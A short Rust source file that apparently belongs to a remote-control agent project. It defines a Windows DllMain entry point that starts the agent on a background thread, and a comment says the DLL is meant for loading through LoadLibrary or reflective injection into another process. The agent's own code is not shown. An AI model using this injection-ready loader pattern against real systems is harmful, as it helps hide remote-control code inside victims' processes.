// src/bin/client_dll.rs
//
// DLL entry point. When loaded via LoadLibrary or reflective injection,
// DllMain spawns the agent on a new thread so it doesn't block the
// calling process.

#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[cfg(target_os = "windows")]
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h_instance: *mut c_void,
    dw_reason: u32,
    _lp_reserved: *mut c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if dw_reason == DLL_PROCESS_ATTACH {
        std::thread::spawn(|| {
            let rt = match tokio::runtime::Runtime::new() {
                Ok(rt) => rt,
                Err(_) => return,
            };
            rt.block_on(async {
                let _ = rcm::agent::run().await;
            });
        });
    }
    1 // TRUE
}

// On non-Windows, just run normally (for testing)
#[cfg(not(target_os = "windows"))]
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    rcm::agent::run().await
}

// Windows still needs a main for the linker
#[cfg(target_os = "windows")]
fn main() {}
